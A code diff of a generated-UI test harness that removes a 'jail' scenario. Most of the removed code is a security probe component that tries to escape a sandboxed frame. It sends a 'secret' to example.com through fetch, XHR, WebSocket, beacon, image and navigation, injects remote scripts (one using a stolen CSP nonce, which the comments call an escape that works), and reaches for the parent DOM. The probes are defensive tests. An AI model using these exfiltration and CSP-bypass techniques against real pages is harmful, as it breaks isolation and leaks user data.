@@ -487,341 +487,9 @@ const components: Record<string, ComponentType> = {
 
 const tree = browserTreeFixture;
 
-const securitySource = String.raw`
-import React, { useEffect, useState } from "react";
-
-export default function SecurityProbe({ label, onRun, exfilOrigin }) {
-  const [fetchStatus, setFetchStatus] = useState("not run");
-  const [xhrStatus, setXhrStatus] = useState("not run");
-  const [socketStatus, setSocketStatus] = useState("not run");
-  const [importStatus, setImportStatus] = useState("not run");
-  const [runtimeImportStatus, setRuntimeImportStatus] = useState("not run");
-  const [remoteScriptStatus, setRemoteScriptStatus] = useState("not run");
-  const [stolenNonceStatus, setStolenNonceStatus] = useState("not run");
-  const [violations, setViolations] = useState([]);
-  const [parentStatus, setParentStatus] = useState("not run");
-  const [actionStatus, setActionStatus] = useState("not run");
-  const [navigateStatus, setNavigateStatus] = useState("not run");
-  const [beaconStatus, setBeaconStatus] = useState("not run");
-  const [imageStatus, setImageStatus] = useState("not run");
-  const [expanded, setExpanded] = useState(false);
-
-  async function probeFetch() {
-    try {
-      await fetch("https://example.com/probe");
-      setFetchStatus("UNEXPECTED SUCCESS");
-    } catch {
-      setFetchStatus("FAILURE (CSP)");
-    }
-  }
-
-  // XHR is a distinct API from fetch but the same connect-src directive governs it.
-  function probeXhr() {
-    try {
-      const xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://example.com/xhr-exfil?secret=" + encodeURIComponent(label));
-      xhr.onload = () => setXhrStatus("UNEXPECTED SUCCESS");
-      xhr.onerror = () => setXhrStatus("FAILURE (CSP)");
-      xhr.send();
-    } catch {
-      setXhrStatus("FAILURE (CSP)");
-    }
-  }
-
-  // WebSocket construction is blocked outright by connect-src 'none' (throws).
-  function probeSocket() {
-    try {
-      const socket = new WebSocket("wss://example.com/socket-exfil");
-      socket.onopen = () => setSocketStatus("UNEXPECTED SUCCESS");
-      socket.onerror = () => setSocketStatus("FAILURE (CSP)");
-    } catch {
-      setSocketStatus("FAILURE (CSP)");
-    }
-  }
-
-  // A written import() is rewritten by sucrase into the jail's own require, so
-  // it never becomes a module fetch at all. That is the LOADER refusing an
-  // unknown specifier, not CSP — the two mechanisms are asserted separately
-  // because a source rewrite cannot see code built at runtime (below).
-  async function probeImport() {
-    try {
-      await import("https://example.com/mod.js");
-      setImportStatus("UNEXPECTED SUCCESS");
-    } catch {
-      setImportStatus("FAILURE (jail require)");
-    }
-  }
-
-  // The escape a source rewrite cannot reach: the import URL is composed at
-  // runtime, so sucrase never sees it and only script-src can stop it. Every
-  // probe below targets a REAL module on a real origin, so "UNEXPECTED SUCCESS"
-  // means foreign code actually ran in here — not that a request 404'd.
-  const exfilUrl = suffix => exfilOrigin + "/exfil-target.js?" + suffix + "=" + encodeURIComponent(label);
-
-  async function probeRuntimeImport() {
-    try {
-      await new Function("url", "return import(url)")(exfilUrl("import-secret"));
-      setRuntimeImportStatus("UNEXPECTED SUCCESS");
-    } catch {
-      setRuntimeImportStatus("FAILURE (CSP)");
-    }
-  }
-
-  // The escape that actually works: CSP blanks a nonce's content ATTRIBUTE but
-  // the IDL property survives, so same-document code can read the jail's own
-  // nonce off any script element and stamp it on one it injects.
-  function probeStolenNonce() {
-    const stolen = document.querySelector("script")?.nonce ?? "";
-    const tag = document.createElement("script");
-    tag.nonce = stolen;
-    tag.onload = () => setStolenNonceStatus("UNEXPECTED SUCCESS nonce=" + (stolen === "" ? "none" : "stolen"));
-    tag.onerror = () => setStolenNonceStatus("FAILURE (CSP) nonce=" + (stolen === "" ? "none" : "stolen"));
-    tag.src = exfilUrl("nonce-secret");
-    document.head.appendChild(tag);
-  }
-
-  // A classic script element: the other half of what an empty source list denies.
-  function probeRemoteScript() {
-    const tag = document.createElement("script");
-    tag.onload = () => setRemoteScriptStatus("UNEXPECTED SUCCESS");
-    tag.onerror = () => setRemoteScriptStatus("FAILURE (CSP)");
-    tag.src = exfilUrl("script-secret");
-    document.head.appendChild(tag);
-  }
-
-  function probeParent() {
-    try {
-      void parent.document.body;
-      setParentStatus("UNEXPECTED SUCCESS");
-    } catch {
-      setParentStatus("FAILURE (opaque origin)");
-    }
-  }
-
-  // Exfiltration by navigating the jail frame itself: governed by neither
-  // connect-src nor img-src nor the sandbox's form/popup flags.
-  function probeNavigate() {
-    try {
-      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
-      setNavigateStatus("navigation attempted");
-    } catch {
-      setNavigateStatus("FAILURE (blocked)");
-    }
-  }
-
-  function probeBeacon() {
-    try {
-      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
-      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
-    } catch {
-      setBeaconStatus("FAILURE (CSP)");
-    }
-  }
-
-  function probeImage() {
-    const img = new Image();
-    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
-    img.onerror = () => setImageStatus("FAILURE (CSP)");
-    img.src = "https://example.com/pixel.png?secret=1";
-  }
-
-  async function dispatch() {
-    await onRun();
-    setActionStatus("delivered");
-  }
-
-  // The block is asserted from the browser's own report, not only from a caught
-  // rejection: a rejected import could mean the request left and then 404'd.
-  useEffect(() => {
-    const record = event => setViolations(seen => [...seen, event.effectiveDirective]);
-    document.addEventListener("securitypolicyviolation", record);
-    return () => document.removeEventListener("securitypolicyviolation", record);
-  }, []);
-
-  return <section
-    aria-label="Generated security probe"
-    style={{ minHeight: "100vh", paddingBottom: 40 }}
-  >
-    <h2>{label}</h2>
-    <button type="button" onClick={() => setExpanded(value => !value)}>
-      {expanded ? "Collapse content" : "Expand content"}
-    </button>
-    <div
-      aria-label="Resizable generated content"
-      style={{ height: expanded ? 520 : 80, background: "linear-gradient(#dbeafe, #eff6ff)" }}
-    />
-    <button type="button" onClick={probeFetch}>Probe fetch</button>
-    <output id="fetch-status">fetch: {fetchStatus}</output>
-    <button type="button" onClick={probeXhr}>Probe xhr</button>
-    <output id="xhr-status">xhr: {xhrStatus}</output>
-    <button type="button" onClick={probeSocket}>Probe socket</button>
-    <output id="socket-status">socket: {socketStatus}</output>
-    <button type="button" onClick={probeImport}>Probe import</button>
-    <output id="import-status">import: {importStatus}</output>
-    <button type="button" onClick={probeRuntimeImport}>Probe runtime import</button>
-    <output id="runtime-import-status">runtime import: {runtimeImportStatus}</output>
-    <button type="button" onClick={probeStolenNonce}>Probe stolen nonce</button>
-    <output id="stolen-nonce-status">stolen nonce: {stolenNonceStatus}</output>
-    <button type="button" onClick={probeRemoteScript}>Probe remote script</button>
-    <output id="remote-script-status">remote script: {remoteScriptStatus}</output>
-    <output id="csp-violations">violations: {violations.join(",")}</output>
-    <button type="button" onClick={probeParent}>Probe parent DOM</button>
-    <output id="parent-status">parent: {parentStatus}</output>
-    <button type="button" onClick={dispatch}>Dispatch action</button>
-    <output id="action-status">action: {actionStatus}</output>
-    <button type="button" onClick={probeNavigate}>Probe navigate</button>
-    <output id="navigate-status">navigate: {navigateStatus}</output>
-    <button type="button" onClick={probeBeacon}>Probe beacon</button>
-    <output id="beacon-status">beacon: {beaconStatus}</output>
-    <button type="button" onClick={probeImage}>Probe image</button>
-    <output id="image-status">image: {imageStatus}</output>
-  </section>;
-}
-`;
-
-const throwingSource = String.raw`
-export default function ThrowingGeneratedComponent() {
-  throw new Error("generated render exploded inside its jail");
-}
-`;
-
-const emptySource = String.raw`
-export default function EmptyGeneratedComponent() {
-  return null;
-}
-`;
-
-// unified-try-surface Defect 2 (form submit dead in the real nested jail):
-// the exact pretraining-habit shape the report found — a RAW <form> (not the
-// Kit's <Form>) whose onSubmit handler is async and takes NO event argument,
-// so it structurally cannot call preventDefault() itself. Only the jail
-// runtime's own document-level capture-phase listener can save this submit
-// from the sandbox's no-allow-forms block.
-const rawFormSource = String.raw`
-import React, { useState } from "react";
-
-export default function RawFormProbe({ onRun }) {
-  const [phase, setPhase] = useState("idle");
-
-  // No event parameter — mirrors the report's exact defect shape.
-  const handleSubmit = async () => {
-    await onRun();
-    setPhase("submitted");
-  };
-
-  return <form onSubmit={handleSubmit} aria-label="Raw form probe">
-    <input type="text" defaultValue="untouched" />
-    <button type="submit">Submit raw form</button>
-    <output id="raw-form-phase">phase: {phase}</output>
-  </form>;
-}
-`;
-
-const furnishedPinSource = String.raw`
-import { FurnishedCardBody } from "./FurnishedCardBody";
-
-export default function FurnishedPin(props) {
-  return <FurnishedCardBody {...props} />;
-}
-`;
-
-const furnishedCardBodySource = String.raw`
-import { FurnishedBadge } from "./FurnishedBadge";
-
-export function FurnishedCardBody({ customer, total }) {
-  return <article className="furnished-pin-card">
-    <FurnishedBadge />
-    <h2>Furnished fork for {customer}</h2>
-    <p>Stubbed invoice total: {total}</p>
-  </article>;
-}
-`;
-
-const furnishedBadgeSource = String.raw`
-export function FurnishedBadge() {
-  return <span className="furnished-pin-badge">captured styles</span>;
-}
-`;
-
-const jailTree: UIPayload & { furnishings: Record<string, unknown> } = {
-  formatVersion: "vendo-genui/v2",
-  root: "root",
-  nodes: [
-    { id: "root", component: "Stack", children: ["before", "furnished", "probe", "rawform", "thrower", "empty", "after"] },
-    { id: "before", component: "Text", props: { text: "Jail siblings before" } },
-    { id: "furnished", component: "FurnishedPin", source: "generated" },
-    {
-      id: "probe",
-      component: "SecurityProbe",
-      source: "generated",
-      props: {
-        label: "Rendered generated props",
-        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
-        // A real, reachable origin that is nonetheless NOT in the jail's
-        // script-src (nothing is): the module-loader probes need a target whose
-        // "LOADED" is unambiguous, and the harness is the honest one to use.
-        exfilOrigin: location.origin,
-      },
-    },
-    {
-      id: "rawform",
-      component: "RawFormProbe",
-      source: "generated",
-      props: {
-        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_raw" } },
-      },
-    },
-    { id: "thrower", component: "ThrowingGeneratedComponent", source: "generated" },
-    { id: "empty", component: "EmptyGeneratedComponent", source: "generated" },
-    { id: "after", component: "Text", props: { text: "Jail sibling survived" } },
-  ],
-  components: {
-    FurnishedPin: furnishedPinSource,
-    SecurityProbe: securitySource,
-    RawFormProbe: rawFormSource,
-    ThrowingGeneratedComponent: throwingSource,
-    EmptyGeneratedComponent: emptySource,
-  },
-  furnishings: {
-    FurnishedPin: {
-      sourceImports: { "./FurnishedCardBody": "src/components/FurnishedCardBody.tsx" },
-      subSources: {
-        "src/components/FurnishedCardBody.tsx": {
-          source: furnishedCardBodySource,
-          imports: { "./FurnishedBadge": "src/components/FurnishedBadge.tsx" },
-        },
-        "src/components/FurnishedBadge.tsx": {
-          source: furnishedBadgeSource,
-          imports: {},
-        },
-      },
-      sampleProps: { customer: "Ada", total: "$4,200" },
-      styles: [{
-        path: "src/app/globals.css",
-        css: String.raw`
-          .furnished-pin-card {
-            background: rgb(239, 246, 255);
-            border: 2px solid rgb(37, 99, 235);
-            border-radius: 14px;
-            padding: 16px;
-          }
-          .furnished-pin-badge {
-            background: rgb(30, 64, 175);
-            border-radius: 999px;
-            color: white;
-            display: inline-block;
-            font-weight: 700;
-            padding: 4px 10px;
-          }
-        `,
-      }],
-    },
-  },
-};
-
 /** 06-apps §9 — the in-client venue scenario: the SAME generated source, once
  *  with a server-granted hash-pinned approval (host-page mount, host-page
- *  authority) and once with a stale approval (loud drop-back to the jail). */
+ *  authority) and once with a stale approval (loud drop-back notice). */
 const inClientSource = String.raw`
 import React, { useState } from "react";
 
@@ -829,7 +497,7 @@ export default function PromotedCard({ customer, onRun }) {
   const [fetchStatus, setFetchStatus] = useState("not run");
   const [actionStatus, setActionStatus] = useState("not run");
 
-  // In the host page this SUCCEEDS (host authority); the jail's CSP forbids it.
+  // In the host page this SUCCEEDS — the mount carries host authority.
   async function probeFetch() {
     try {
       const response = await fetch("/frame-target.html");
@@ -919,7 +587,7 @@ function InClientScenario() {
 /** Remix final shape (2026-08-02) — the review-kind standing scenario: the
  *  payload the server ships for an unapproved review-kind version (venue
  *  `pending-review`, NO component source travels), once awaiting review and
- *  once carrying the reviewer's rejection note. Neither may jail-render. */
+ *  once carrying the reviewer's rejection note. Neither may render. */
 function reviewStandingTree(review: Record<string, unknown>): UIPayload {
   return {
     formatVersion: "vendo-genui/v2",
@@ -967,7 +635,7 @@ function ReviewStandingScenario() {
 /** 06-apps §8 — the drift notice scenario: the host updated the component this
  *  app was seeded from, so the payload carries a server-written `seedDrift`
  *  report. The surface says so loudly ABOVE the tree while the remix keeps
- *  rendering in its jail — nothing changes without the user. */
+ *  rendering — nothing changes without the user. */
 const driftedSeedSource = String.raw`
 import React from "react";
 
@@ -1168,16 +836,11 @@ function InjectedTreeScenario() {
   );
 }
 
-function TreeScenario({ jail = false }: { jail?: boolean }) {
-  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
-  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
-    setAction(request);
-    return { status: "ok", output: { recorded: true } };
-  };
+function TreeScenario() {
+  const onAction = async (): Promise<ToolOutcome> => ({ status: "ok", output: { recorded: true } });
   return (
     <TreeThemeBoundary>
-      <TreeView tree={jail ? jailTree : tree} components={components} onAction={onAction} />
-      {jail ? <output className="recorder" data-testid="action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output> : null}
+      <TreeView tree={tree} components={components} onAction={onAction} />
     </TreeThemeBoundary>
   );
 }
@@ -1195,7 +858,7 @@ function AppFrameScenario() {
 
 /**
  * The frame resize protocol, host half. The served-app fixture reports its own
- * natural height over the jail's exact message shape; each section is a host
+ * natural height over the shared resize message shape; each section is a host
  * that configured its slot differently, and the frame fits the report INSIDE
  * that slot — never outside it.
  */
@@ -1465,8 +1128,8 @@ const storedTree: UIPayload = {
  * WAVE 1 GATE (v2 spec §8, docs/superpowers/specs/2026-07-18-vendo-v2-format-spec.md):
  * a vendo-genui/v2 tree renders through the same PayloadView dispatch as every
  * stored payload — side-by-side with a stored v1 tree to prove coexistence.
- * Covers queries → `$path` bindings, host-brand-wins resolution, a jailed
- * generated island, and an action prop dispatching through onAction.
+ * Covers queries → `$path` bindings, host-brand-wins resolution, a generated
+ * component, and an action prop dispatching through onAction.
  */
 const TREE_PAYLOAD: UIPayload = {
   formatVersion: "vendo-genui/v2",
@@ -2146,7 +1809,6 @@ function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme
     case "/unconfigured-posture": return { title: "Unconfigured posture — every consumer surface (C1)", content: <UnconfiguredPostureScenario />, ownProvider: true };
     case "/notice": return { title: "Unconfigured policy", ownProvider: true, content: (<VendoProvider client={unconfiguredClient} components={components}><NoPolicyNotice /></VendoProvider>) };
     case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
-    case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
     case "/tree-injected": return { title: "Injected payload (captured host component)", content: <InjectedTreeScenario /> };
     case "/tree-inclient": return { title: "In-client venue (hash-pinned approval)", content: <InClientScenario /> };
     case "/tree-review": return { title: "Review-kind standing (pending / rejected)", content: <ReviewStandingScenario /> };
